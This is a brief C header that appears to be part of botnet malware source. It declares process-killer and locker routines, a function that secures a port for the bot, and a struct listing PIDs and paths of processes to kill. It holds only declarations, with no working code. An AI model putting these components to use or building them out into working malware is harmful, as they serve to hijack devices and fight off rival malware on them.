#pragma once

void killer_init(void);
void locker_init(void);
void locker_kill(void);


void secure_port_for_bot(uint16_t port);

typedef struct kill_t 
{
    struct kill_t *next;

    unsigned int n_pid;
    char pid[256], path[256];
} Kill;
